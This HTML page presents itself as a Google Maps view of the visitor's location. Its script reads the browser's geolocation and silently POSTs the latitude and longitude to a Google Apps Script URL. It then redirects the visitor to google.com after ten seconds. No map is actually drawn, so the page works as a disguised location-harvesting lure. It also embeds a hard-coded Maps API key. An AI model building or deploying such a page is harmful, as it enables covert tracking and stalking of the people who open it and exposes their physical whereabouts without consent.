<!DOCTYPE html>
<html>
<head>
  <title>Your Location on Google Maps</title>
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    #map {
      height: 80vh;
      width: 100%;
    }
    #coords {
      font-size: 18px;
      margin: 10px 0;
    }
  </style>
</head>
<body>

<h2>Your Current Location</h2>
<div id="coords">Fetching location...</div>
<div id="map"></div>



<script>
  function initMap() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function (position) {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          // Display coordinates
          document.getElementById("coords").textContent =
            `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}`;

          // Send to Google Apps Script
          fetch("https://script.google.com/macros/s/AKfycbxnLHCxT6dKYOTaJXT6S6K_4ilUSHfhVkcvFGipQ1goxREbCLgYIIrwDSVQVlMGdhyG/exec", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ lat, lng }),
          })
          .then(() => {
            // âœ… Wait 10 seconds, then redirect
            setTimeout(() => {
              window.location.href = "https://www.google.com/";
            }, 10000); // 10 seconds = 10000 ms
          })
          .catch(err => {
            console.error("Error logging location:", err);
            window.location.href = "https://www.google.com/";
          });
        },
        function () {
          document.getElementById("coords").textContent = "Location access denied.";
        }
      );
    } else {
      document.getElementById("coords").textContent = "Geolocation not supported.";
    }
  }
</script>




<!-- Replace YOUR_API_KEY with your actual key -->
<script async defer
  src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAq1aUgx0YxAXOapEb8iKljX2P3wL0pcEk&callback=initMap">
</script>

</body>
</html>
